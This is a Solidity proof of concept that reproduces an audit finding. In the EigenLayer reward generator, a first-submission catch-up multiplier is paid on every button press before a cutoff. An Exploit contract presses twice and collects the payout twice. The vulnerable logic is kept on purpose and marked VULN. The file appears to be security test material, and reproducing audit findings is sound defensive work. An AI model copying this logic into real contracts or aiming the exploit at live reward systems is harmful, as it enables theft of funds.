// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  EigenLayer RewardAllStakersActionGenerator — first submission repeats
    (Sigma Prime, finding 53581).
    SYNTHETIC, cheatcode-free reduction.
    generateHopperActions applies the catch-up multiple whenever
    block.timestamp <= firstSubmissionTriggerCutoff. It does not remember
    that the first submission already happened. With the hopper cooldown at
    0, pressButton twice in the cutoff window pays the catch-up twice.
    One interval is 1 second in this model so two elapsed intervals fit in
    a single block. Vulnerable multiply preserved below (@> VULN). */

contract Token {
    string public symbol = "EIGEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RewardAllStakersActionGenerator {
    uint32 public firstSubmissionStartTimestamp;
    uint256 public firstSubmissionTriggerCutoff;
    uint256 public constant CALCULATION_INTERVAL_SECONDS = 1;
    uint256 public amounts0;

    constructor(uint256 perInterval) {
        amounts0 = perInterval;
        firstSubmissionStartTimestamp = uint32(block.timestamp) - 2;
        firstSubmissionTriggerCutoff = block.timestamp + 52 weeks;
    }

    function generateHopperActions() external view returns (uint256 amountsToUse0, bool firstBranch) {
        amountsToUse0 = amounts0;
        if (block.timestamp <= firstSubmissionTriggerCutoff) { // @> VULN: every press before the cutoff applies the catch-up multiple
            uint32 multiple = (uint32(block.timestamp) - firstSubmissionStartTimestamp) / uint32(CALCULATION_INTERVAL_SECONDS);
            amountsToUse0 = amounts0 * multiple;
            firstBranch = true;
        }
    }
}

contract TokenHopper {
    Token public token;
    RewardAllStakersActionGenerator public generator;
    address public receiver;
    uint256 public cooldown;
    uint256 public lastPress;
    uint256 public presses;
    uint256 public paid;
    bool public trackFirst;
    bool public firstDone;

    constructor(Token t, RewardAllStakersActionGenerator g, address r, bool track) {
        token = t;
        generator = g;
        receiver = r;
        cooldown = 0;
        trackFirst = track;
    }

    function pressButton() external {
        require(block.timestamp >= lastPress + cooldown, "cooldown");
        lastPress = block.timestamp;
        (uint256 amountsToUse0, bool firstBranch) = generator.generateHopperActions();
        if (trackFirst && firstBranch) {
            require(!firstDone, "already submitted");
            firstDone = true;
        }
        token.transfer(receiver, amountsToUse0);
        presses += 1;
        paid += amountsToUse0;
    }
}

contract Exploit {
    Token public token; // CREATE nonce 1
    RewardAllStakersActionGenerator public generator; // CREATE nonce 2
    TokenHopper public hopper; // CREATE nonce 3
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant PER_INTERVAL = 50e18;

    constructor() {
        token = new Token();
        generator = new RewardAllStakersActionGenerator(PER_INTERVAL);
        hopper = new TokenHopper(token, generator, address(this), false);
    }

    function run() external {
        token.mint(address(hopper), 400e18);
        hopper.pressButton();
        hopper.pressButton();
        uint256 intended = PER_INTERVAL * 2;
        uint256 extra = token.balanceOf(address(this)) - intended;
        token.transfer(SINK, extra);
        require(hopper.presses() == 2, "two presses");
        require(hopper.paid() == intended * 2, "catch-up paid twice");
        require(token.balanceOf(SINK) == intended, "extra interval tokens");
    }
}
